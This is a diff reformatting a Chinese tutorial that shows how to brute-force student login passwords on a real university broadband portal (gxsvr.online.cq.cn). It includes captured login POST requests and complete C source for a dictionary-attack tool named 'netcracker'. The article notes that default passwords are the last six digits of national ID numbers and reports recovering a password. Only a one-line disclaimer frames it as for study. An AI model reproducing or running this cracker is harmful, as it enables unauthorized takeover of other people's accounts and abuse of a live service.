@@ -1,303 +1,488 @@
 
-
 # 打造高校宽带破解工具
 
-> 原文：[`www.pediy.com/kssd/pediy10/104258.html`](https://www.pediy.com/kssd/pediy10/104258.html)
+> 原文：`www.pediy.com/kssd/pediy10/104258.html`
 
-原创：                by  trojancyborg  
-            在此感谢 R.E.C--F22 队长的帮助，自己在网上又搜了些资料，于是就有了此文。  
-  
-  
-好不容易今年考上大学，本以为大学上网可以用一个路由器，不料学校用的是一个客户端登陆软件，后来才清楚其实现在很多高校都是用的这种类似的登陆软件。  
-看到它的第一眼我就抓包，结果以失败告终，引用队长的话说就是底层队长抓包成功率很低。  
-俺很不服啊，于是用鼠标键盘事件的函数做了一个模仿登陆的程序来破解，不过速度之慢，我自己都不敢恭维，后来听室友小潘给了个建议，用充值时的登陆网页来做手脚。  
-我们的用户名长度都是 13BYTE，按照 XXXXXXX@cqupt 这种格式的，  
-密码默认为身份证后 6 位，于是自己写了个后六位的密码生成器，网上也有下的，我就不多说了。  
-![](img/3a54d94a5c12418804f2b7713aa0a4e8.jpg)  
-  
-  
-先用 winsock 抓包，账号密码分别填 1234567@cqupt 和 123456 结果如下  
-POST /servlet/LoginServlet HTTP/1.1  
-Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/QVOD, application/QVOD, \*/\*  
-Referer: http://gxsvr.online.cq.cn/servlet/IndexServlet  
-Accept-Language: zh-cn  
-Content-Type: application/x-www-form-urlencoded  
-UA-CPU: x86  
-Accept-Encoding: gzip, deflate  
-User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)  
-Host: gxsvr.online.cq.cn  
-Content-Length: 37  
-Connection: Keep-Alive  
-Cache-Control: no-cache  
-  
-loginID=1234567@cqupt&password=123456  
-![](img/fcac78f1c8aebfd7ded2cb353748219b.jpg)  
-loginID 和 password 分别对应账号和密码。  
-  
-现在换个方便的工具吧，http 发包抓包程序火狐专版.exe  
-填上地址 http://gxsvr.online.cq.cn/servlet/IndexServlet，选择 POST，点开始  
-“发出内容”里面其实就是提交的内容  
-如下：  
-POST /servlet/IndexServlet HTTP/1.0  
-Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/msword, application/vnd.ms-powerpoint, \*/\*  
-Accept-Language: en-us  
-Accept-Encoding: gzip, deflate  
-User-Agent: Mozilla/4.0  
-Host: GXSVR.ONLINE.CQ.CN  
-Content-Type: application/x-www-form-urlencoded  
-![](img/bca2b1335066c19bd08fe9dce7718479.jpg)  
-  
-左边就是发送的和收到的内容，  
-上面只是我们做的一个简单的测试。  
-下面我们根据第一次抓包的内容伪造一个账户密码的 POST 提交  
-在名为“发送数据”的控件里输入以下内容  
-loginID=1234567@cqupt&password=123456  
-点 POST，开始，我们点下查看网页数据就能看见网页返回的数据了，  
-由于我们是随意的输入的数据，所以返回用户密码错误的提示  
-![](img/d8074d2dec3ba80709d3cfb6c5984ae0.jpg)  
-发送的数据内容：  
-  
-POST /servlet/LoginServlet HTTP/1.0  
-Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/msword, application/vnd.ms-powerpoint, \*/\*  
-Accept-Language: en-us  
-Accept-Encoding: gzip, deflate\\  
-User-Agent: Mozilla/4.0  
-Content-Length: 37  
-Host: GXSVR.ONLINE.CQ.CN  
-Content-Type: application/x-www-form-urlencoded  
-  
-  
-loginID=1234567@cqupt&password=123456;  
-  
-  
-我们换个正确的账号试试。点“开始”，然后点查看网页数据  
-返回的其实是登陆成功的页面信息。  
-![](img/56d84bf521d09ab2adbf61ab24e0ed55.jpg)  
-  
-好了，后面我就直接贴代码吧，根据返回数据中是否有“身份证”这个关键词判断密码是否正确。  
-程序模仿 POST 提交时发送的数据其实就是上图中“发出内容”控件中的内容  
-下面我直接贴代码吧。本来做了个多线程的，不过效果不理想，于是改成单线程了，如果有需要，可以自己改改。因为我做了测试后才发现其实速度都差不多了，因为服务器处理的能力有限，快的时候 1S 大概能破解 30 个左右，这样算下来，310000 个密码大概三个钟头，实际上大概要 5 个钟头左右，因为连接到了一定数量，服务器的处理速度反而会下降，经常会连接不上，不过程序里也简单的做出了相应的处理。  
-  
-  
-//netcracker.cpp  
-//ver 1.0  
-#include "stdafx.h"  
-#include "stdio.h"  
-#include "winsock2.h"  
-#include <string.h>  
-#include <stdlib.h>  
-#include <dos.h>  
-#pragma   comment(lib,"ws2\_32.lib")  
-#define   winsock\_version   0x0101  
-  
-  
-int PostThreadFun(LPVOID lpParam);  
-  
-char UserName\[128\]={0};                //待破解账号  
-char PwdDicName\[128\]={0};        //字典文件名  
-int     delay;                                //延时  
-                                 
-bool    FindState=false;  
-bool        FileState=true;  
-FILE        \*fp;                                //字典文件句柄  
-  
-  
-//////////////////////////////////////////////////////////////////////////////////////////////  
-//netcracker username pswdicname Threadnum delay  
-  
-int   main(int argc,char \*\*argv)  
-{  
-WSADATA   wsadata;  
-  
-if(WSAStartup(winsock\_version,&wsadata))                //初始化版本  
-        {  
-        printf("can't  initial socket");  
-        return 1;  
-        }  
-  
-printf("socket init ok\\n");  
-  
-if (argc<3)  
-{  
-        printf("----------    netcracker           v1.0    -----------------------\\n");  
-        printf("netcracker.exe username passworddicname \[delayms\]\\n\\n");  
-        printf("                     http:\\\\bbs.isbase.net\\n");  
-        printf("                     by      trojancyborg\\n");  
-        printf("ps:username must 13byte,password must be 6byte\\n");  
-        printf("example:\\n");  
-        printf("netcracker 1234567@cqupt dic.txt\\n");  
-        return 0;  
-}  
-  
-  
-strcpy(UserName,argv\[1\]);  
-strcpy(PwdDicName,argv\[2\]);  
-  
-delay=0;                        //延时初始化  
-if (argv\[3\]!=NULL)  
-delay=atoi(argv\[3\]);  
-  
-if (delay<0)  
-delay=0;  
-else if (delay>6000)  
-delay=6000;  
-  
-fp=fopen(PwdDicName,"r");//在主线程打开字典，全局文件句柄可被各个线程调用  
-  
-if(!fp)    
-        {  
-        printf("open dic file error\\n");  
-        return 0;  
-        }  
-  
-  
-PostThreadFun(NULL);//模拟 POST 数据  
-  
-fclose(fp);  
-printf("finish\\n");  
-return 0;  
-  
-}  
-  
-//////////////////////////////////////////////////////////////////////  
-int PostThreadFun(LPVOID lpParam)  
-{  
-  
-  
-LPHOSTENT   lphostent;  
-int                        nRet;  
-char\*                pstr;  
-char\*                host\_name="gxsvr.online.cq.cn";  
-char                pwd\[100\]\[10\]={0};  
-int                        num;                                 
-int                        pwdnum;                                //实际读取的密码个数  
-int                        connecterror=0;  
-  
-//post 的内容  
-char   req\[\]="POST /servlet/LoginServlet HTTP/1.0\\r\\n\\  
-Accept: image/gif, image/x-xbitmap, image/jpeg\\  
-, image/pjpeg, application/vnd.ms-excel\\  
-, application/msword, application/vnd.ms-powerpoint, \*/\*\\r\\n\\  
-Accept-Language: en-us\\r\\n\\  
-Accept-Encoding: gzip, deflate\\r\\n\\  
-User-Agent: Mozilla/4.0\\r\\n\\  
-Content-Length: 37\\r\\n\\  
-Host: GXSVR.ONLINE.CQ.CN\\r\\n\\  
-Content-Type: application/x-www-form-urlencoded\\r\\n\\r\\n\\  
-loginID=                                                                   ";  
-//loginID=XXXXXX@cqupt&password=XXXXXX"  
-  
-pstr=strstr(req,"loginID=");//字段填充  
-pstr=pstr+strlen("loginID=");  
-strcpy(pstr,UserName);  
-  
-pstr=strstr(req,UserName);  
-pstr=pstr+strlen(UserName);  
-strcpy(pstr,"&password=");  
-  
-pstr=strstr(req,"&password=");  
-pstr=pstr+strlen("&password=");  
-  
-  
-  
-lphostent=gethostbyname(host\_name);  
-if(lphostent==NULL)  
-        {  
-        printf("lphostent   is   null\\n");  
-        return 1;  
-        }  
-  
-  
-while (!FindState && FileState)        //当密码未找到，字典未读取完时继续循环  
-{  
-  
-num=0;  
-while((FileState=(fscanf(fp,"%s",pwd\[num\]))>0))    //读取字典文件,每次读取 100 个密码  
-{  
-        num++;                                                                 
-        if (num==100) break;  
-}  
-  
-pwdnum=num;                                                                //保存实际读取的密码个数  
-num=0;                                         
-while (num<pwdnum && !FindState)                //逐一将读取的密码进行 POST 操作  
-{  
-  
-if (strlen(pwd\[num\])==6)                                //判断密码的长度，默认是 6BYTE  
-                                                                        //账户和密码的长度会影响到 Content-Length 字段的值                                                                                //详见：Content-Length: 37\\r\\n  
-        strcpy(pstr,pwd\[num\]);                                //初始化密码  
-else  
-{  
-        printf("password format error!: %s\\n",pstr);  
-        num++;  
-        continue;  
-}                         
-  
-SOCKADDR\_IN   stServer;  
-SOCKET   hsocket;  
-  
-hsocket   =   socket(AF\_INET,   SOCK\_STREAM,   IPPROTO\_TCP);  
-stServer.sin\_family   =   AF\_INET;  
-stServer.sin\_port   =   htons(80);  
-stServer.sin\_addr   =   \*((LPIN\_ADDR)\*lphostent->h\_addr\_list);  
-  
-nRet   =   connect(hsocket,   (LPSOCKADDR)&stServer,   sizeof(SOCKADDR\_IN));  
-if   (nRet   ==   SOCKET\_ERROR)  
-{  
-    connecterror++;  
-        printf("can't connect  times:%d   pwd:%s \\n",connecterror,pwd\[num\]);  
-    closesocket(hsocket);  
-        if (connecterror==20) return 1;//如果连续二十次未连接成功，中断改线程  
-        Sleep(2000);  
-    continue;//重新连接，继续尝试改密码  
-}  
-  
-  
-nRet = send(hsocket,req,strlen(req),0);  
-  
-if   (nRet   ==   SOCKET\_ERROR)  
-{  
-    printf("send()   failed\\n");  
-    closesocket(hsocket);  
-        continue;  
-}  
-char   dest\[10240\];  
-nRet=1;  
-while(nRet>0)  
-{  
-    nRet=recv(hsocket,(LPSTR)dest,sizeof(dest),0);  
-    if(nRet>0)  
-        dest\[nRet\]=0;  
-    else  
-        dest\[0\]=0;  
-        if (strstr(dest,"身份证"))  
-        {//state=true;  
-        printf("\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\\n");  
-        printf("find password !!user:%s  password:%s\\n",UserName,pwd\[num\]);  
-        printf("\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\\n");  
-        FILE \*psave;  
-        psave=fopen("result.txt","a");  
-        fprintf(psave,"user:%s   password:%s \\n",UserName,pwd\[num\]);  
-        fclose(psave);  
-        FindState=true;        //找到密码，让其他线程终止  
-        }  
-  
-}  
-  
-printf("user:%s           pwd: %s\\n",UserName,pwd\[num\]);  
-connecterror=0;//连接错误数量置 0  
-closesocket(hsocket);  
-num++;  
-Sleep(delay);  
-}  
-}  
-  
-return 0;  
-}  
-  
-简单的说，对于 POST 的数据，一个 send 函数就行了，关键在于发送的数据内容，只要抓包后按固定的格式依样画葫芦就 OK 了，网站返回的数据用 recv 就行了。  
-  
-用我自己的账号做了个测试，运行结果如下：  
-（红色部分就是跑出来的密码）  
-![](img/fc1db2dcb672e5d478836751dfb2eb83.jpg)  
+原创：by `trojancyborg`
+
+在此感谢 `R.E.C`-`F22` 队长的帮助，自己在网上又搜了些资料，于是就有了此文。
+
+好不容易今年考上大学，本以为大学上网可以用一个路由器，不料学校用的是一个客户端登陆软件，后来才清楚其实现在很多高校都是用的这种类似的登陆软件。
+
+看到它的第一眼我就抓包，结果以失败告终，引用队长的话说就是底层队长抓包成功率很低。
+
+俺很不服啊，于是用鼠标键盘事件的函数做了一个模仿登陆的程序来破解，不过速度之慢，我自己都不敢恭维，后来听室友小潘给了个建议，用充值时的登陆网页来做手脚。
+
+我们的用户名长度都是 `13BYTE`，按照 `XXXXXXX@cqupt` 这种格式的，
+
+密码默认为身份证后 `6` 位，于是自己写了个后六位的密码生成器，网上也有下的，我就不多说了。
+
+![](img/3a54d94a5c12418804f2b7713aa0a4e8.jpg)
+
+先用 `winsock` 抓包，账号密码分别填 `1234567@cqupt` 和 `123456` 结果如下
+
+```
+POST /servlet/LoginServlet HTTP/1.1
+
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/QVOD, application/QVOD, */*
+
+Referer: http://gxsvr.online.cq.cn/servlet/IndexServlet
+
+Accept-Language: zh-cn
+
+Content-Type: application/x-www-form-urlencoded
+
+UA-CPU: x86
+
+Accept-Encoding: gzip, deflate
+
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)
+
+Host: gxsvr.online.cq.cn
+
+Content-Length: 37
+
+Connection: Keep-Alive
+
+Cache-Control: no-cache
+
+loginID=1234567@cqupt&password=123456
+```
+
+![](img/fcac78f1c8aebfd7ded2cb353748219b.jpg)
+
+`loginID` 和 `password` 分别对应账号和密码。
+
+现在换个方便的工具吧，`http` 发包抓包程序 `火狐专版.exe`
+
+填上地址 `http://gxsvr.online.cq.cn/servlet/IndexServlet`，选择 `POST`，点开始
+
+“发出内容”里面其实就是提交的内容
+
+如下：
+
+```
+POST /servlet/IndexServlet HTTP/1.0
+
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/msword, application/vnd.ms-powerpoint, */*
+
+Accept-Language: en-us
+
+Accept-Encoding: gzip, deflate
+
+User-Agent: Mozilla/4.0
+
+Host: GXSVR.ONLINE.CQ.CN
+
+Content-Type: application/x-www-form-urlencoded
+```
+
+![](img/bca2b1335066c19bd08fe9dce7718479.jpg)
+
+左边就是发送的和收到的内容，
+
+上面只是我们做的一个简单的测试。
+
+下面我们根据第一次抓包的内容伪造一个账户密码的 `POST` 提交
+
+在名为“发送数据”的控件里输入以下内容
+
+`loginID=1234567@cqupt&password=123456`
+
+点 `POST`，开始，我们点下查看网页数据就能看见网页返回的数据了，
+
+由于我们是随意的输入的数据，所以返回用户密码错误的提示
+
+![](img/d8074d2dec3ba80709d3cfb6c5984ae0.jpg)
+
+发送的数据内容：
+
+```
+POST /servlet/LoginServlet HTTP/1.0
+
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/msword, application/vnd.ms-powerpoint, */*
+
+Accept-Language: en-us
+
+Accept-Encoding: gzip, deflate
+
+User-Agent: Mozilla/4.0
+
+Content-Length: 37
+
+Host: GXSVR.ONLINE.CQ.CN
+
+Content-Type: application/x-www-form-urlencoded
+
+loginID=1234567@cqupt&password=123456;
+```
+
+我们换个正确的账号试试。点“开始”，然后点查看网页数据
+
+返回的其实是登陆成功的页面信息。
+
+![](img/56d84bf521d09ab2adbf61ab24e0ed55.jpg)
+
+好了，后面我就直接贴代码吧，根据返回数据中是否有“身份证”这个关键词判断密码是否正确。
+
+程序模仿 `POST` 提交时发送的数据其实就是上图中“发出内容”控件中的内容
+
+下面我直接贴代码吧。本来做了个多线程的，不过效果不理想，于是改成单线程了，如果有需要，可以自己改改。因为我做了测试后才发现其实速度都差不多了，因为服务器处理的能力有限，快的时候 `1S` 大概能破解 `30` 个左右，这样算下来，`310000` 个密码大概三个钟头，实际上大概要 `5` 个钟头左右，因为连接到了一定数量，服务器的处理速度反而会下降，经常会连接不上，不过程序里也简单的做出了相应的处理。
+
+```cpp
+//netcracker.cpp
+
+//ver 1.0
+
+#include "stdafx.h"
+
+#include "stdio.h"
+
+#include "winsock2.h"
+
+#include <string.h>
+
+#include <stdlib.h>
+
+#include <dos.h>
+
+#pragma   comment(lib,"ws2_32.lib")
+
+#define   winsock_version   0x0101
+
+int PostThreadFun(LPVOID lpParam);
+
+char UserName[128]={0};                //待破解账号
+
+char PwdDicName[128]={0};        //字典文件名
+
+int     delay;                               //延时
+
+bool    FindState=false;
+
+bool        FileState=true;
+
+FILE        *fp;                               //字典文件句柄
+
+//////////////////////////////////////////////////////////////////////////////////////////////
+
+//netcracker username pswdicname Threadnum delay
+
+int   main(int argc,char **argv)
+
+{
+
+WSADATA   wsadata;
+
+if(WSAStartup(winsock_version,&wsadata))                //初始化版本
+
+        {
+
+        printf("can't  initial socket");
+
+        return 1;
+
+        }
+
+printf("socket init ok\n");
+
+if (argc<3)
+
+{
+
+        printf("----------    netcracker           v1.0    -----------------------\n");
+
+        printf("netcracker.exe username passworddicname [delayms]\n\n");
+
+        printf("                        http://bbs.isbase.net\n");
+
+        printf("                        by      trojancyborg\n");
+
+        printf("ps:username must 13byte,password must be 6byte\n");
+
+        printf("example:\n");
+
+        printf("netcracker 1234567@cqupt dic.txt\n");
+
+        return 0;
+
+}
+
+strcpy(UserName,argv[1]);
+
+strcpy(PwdDicName,argv[2]);
+
+delay=0;                 //延时初始化
+
+if (argv[3]!=NULL)
+
+delay=atoi(argv[3]);
+
+if (delay<0)
+
+delay=0;
+
+else if (delay>6000)
+
+delay=6000;
+
+fp=fopen(PwdDicName,"r");//在主线程打开字典，全局文件句柄可被各个线程调用
+
+if(!fp)   
+
+        {
+
+        printf("open dic file error\n");
+
+        return 0;
+
+        }
+
+PostThreadFun(NULL);//模拟 POST 数据
+
+fclose(fp);
+
+printf("finish\n");
+
+return 0;
+
+}
+
+//////////////////////////////////////////////////////////////////////
+
+int PostThreadFun(LPVOID lpParam)
+
+{
+
+LPHOSTENT   lphostent;
+
+int                   nRet;
+
+char*                 pstr;
+
+char*                 host_name="gxsvr.online.cq.cn";
+
+char                 pwd[100][10]={0};
+
+int                   num;                  
+
+int                   pwdnum;                   //实际读取的密码个数
+
+int                   connecterror=0;
+
+//post 的内容
+
+char   req[]="POST /servlet/LoginServlet HTTP/1.0\r\n\
+
+Accept: image/gif, image/x-xbitmap, image/jpeg\
+
+, image/pjpeg, application/vnd.ms-excel\
+
+, application/msword, application/vnd.ms-powerpoint, */*\r\n\
+
+Accept-Language: en-us\r\n\
+
+Accept-Encoding: gzip, deflate\r\n\
+
+User-Agent: Mozilla/4.0\r\n\
+
+Content-Length: 37\r\n\
+
+Host: GXSVR.ONLINE.CQ.CN\r\n\
+
+Content-Type: application/x-www-form-urlencoded\r\n\r\n\
+
+loginID=                                     ";
+
+//loginID=XXXXXX@cqupt&password=XXXXXX"
+
+pstr=strstr(req,"loginID=");//字段填充
+
+pstr=pstr+strlen("loginID=");
+
+strcpy(pstr,UserName);
+
+pstr=strstr(req,UserName);
+
+pstr=pstr+strlen(UserName);
+
+strcpy(pstr,"&password=");
+
+pstr=strstr(req,"&password=");
+
+pstr=pstr+strlen("&password=");
+
+lphostent=gethostbyname(host_name);
+
+if(lphostent==NULL)
+
+        {
+
+        printf("lphostent   is   null\n");
+
+        return 1;
+
+        }
+
+while (!FindState && FileState)        //当密码未找到，字典未读取完时继续循环
+
+{
+
+num=0;
+
+while((FileState=(fscanf(fp,"%s",pwd[num]))>0))    //读取字典文件,每次读取 100 个密码
+
+{
+
+        num++;                                                   
+
+        if (num==100) break;
+
+}
+
+pwdnum=num;                                                     //保存实际读取的密码个数
+
+num=0;                  
+
+while (num<pwdnum && !FindState)                //逐一将读取的密码进行 POST 操作
+
+{
+
+if (strlen(pwd[num])==6)                            //判断密码的长度，默认是 6BYTE
+
+                                                     //账户和密码的长度会影响到 Content-Length 字段的值                                             //详见：Content-Length: 37\r\n
+
+        strcpy(pstr,pwd[num]);                            //初始化密码
+
+else
+
+{
+
+        printf("password format error!: %s\n",pstr);
+
+        num++;
+
+        continue;
+
+}                  
+
+SOCKADDR_IN   stServer;
+
+SOCKET   hsocket;
+
+hsocket   =   socket(AF_INET,   SOCK_STREAM,   IPPROTO_TCP);
+
+stServer.sin_family   =   AF_INET;
+
+stServer.sin_port   =   htons(80);
+
+stServer.sin_addr   =   *((LPIN_ADDR)*lphostent->h_addr_list);
+
+nRet   =   connect(hsocket,   (LPSOCKADDR)&stServer,   sizeof(SOCKADDR_IN));
+
+if   (nRet   ==   SOCKET_ERROR)
+
+{
+
+    connecterror++;
+
+        printf("can't connect  times:%d   pwd:%s \n",connecterror,pwd[num]);
+
+    closesocket(hsocket);
+```
+
+
+
+```c
+if (connecterror==20) return 1;//如果连续二十次未连接成功，中断改线程
+
+Sleep(2000);
+
+continue;//重新连接，继续尝试改密码
+
+}
+
+nRet = send(hsocket,req,strlen(req),0);
+
+if   (nRet   ==   SOCKET_ERROR)
+
+{
+
+    printf("send()   failed\n");
+
+    closesocket(hsocket);
+
+        continue;
+
+}
+
+char   dest[10240];
+
+nRet=1;
+
+while(nRet>0)
+
+{
+
+    nRet=recv(hsocket,(LPSTR)dest,sizeof(dest),0);
+
+    if(nRet>0)
+
+        dest[nRet]=0;
+
+    else
+
+        dest[0]=0;
+
+        if (strstr(dest,"身份证"))
+
+        {//state=true;
+
+        printf("********************************************************\n");
+
+        printf("find password !!user:%s  password:%s\n",UserName,pwd[num]);
+
+        printf("********************************************************\n");
+
+        FILE *psave;
+
+        psave=fopen("result.txt","a");
+
+        fprintf(psave,"user:%s   password:%s \n",UserName,pwd[num]);
+
+        fclose(psave);
+
+        FindState=true;        //找到密码，让其他线程终止
+
+        }
+
+}
+
+printf("user:%s            pwd: %s\n",UserName,pwd[num]);
+
+connecterror=0;//连接错误数量置 0
+
+closesocket(hsocket);
+
+num++;
+
+Sleep(delay);
+
+}
+
+}
+
+return 0;
+
+}
+```
+
+简单的说，对于 `POST` 的数据，一个 `send` 函数就行了，关键在于发送的数据内容，只要抓包后按固定的格式依样画葫芦就 OK 了，网站返回的数据用 `recv` 就行了。
+
+用我自己的账号做了个测试，运行结果如下：
+
+（红色部分就是跑出来的密码）
+
+![](img/fc1db2dcb672e5d478836751dfb2eb83.jpg)
+
 后记：本文章仅仅给大家一个简单的实例，请不要将此程序用于非法用途，仅供学习，千万不要搞破坏。
